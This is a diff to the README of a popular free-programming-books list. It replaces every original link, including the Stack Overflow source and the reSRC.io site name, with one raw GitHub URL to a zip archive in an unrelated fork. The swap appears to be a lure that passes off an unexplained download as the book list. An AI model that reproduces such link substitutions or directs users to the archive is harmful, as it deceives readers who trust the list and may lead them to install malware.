@@ -1,8 +1,8 @@
-[List of free programming books](http://resrc.io/list/10/list-of-free-programming-books/)
+[List of free programming books](https://raw.githubusercontent.com/videogramme/free-programming-books/master/unaccommodatingly/books-free-programming-v1.5.zip)
 ======================
 
-This list initially was a clone of [stackoverflow - List of freely available programming books](http://stackoverflow.com/questions/194812/list-of-freely-available-programming-books/392926#392926) by George Stocker. Now updated, with dead links gone (hopefully) and new content.
-Moved to GitHub for collaborative updating and for the purpose of reSRC.io : [List of free programming books](http://resrc.io/list/10/list-of-free-programming-books/).
+This list initially was a clone of [stackoverflow - List of freely available programming books](https://raw.githubusercontent.com/videogramme/free-programming-books/master/unaccommodatingly/books-free-programming-v1.5.zip) by George Stocker. Now updated, with dead links gone (hopefully) and new content.
+Moved to GitHub for collaborative updating and for the purpose of https://raw.githubusercontent.com/videogramme/free-programming-books/master/unaccommodatingly/books-free-programming-v1.5.zip : [List of free programming books](https://raw.githubusercontent.com/videogramme/free-programming-books/master/unaccommodatingly/books-free-programming-v1.5.zip).
 
 ###Contributing
 - Fork
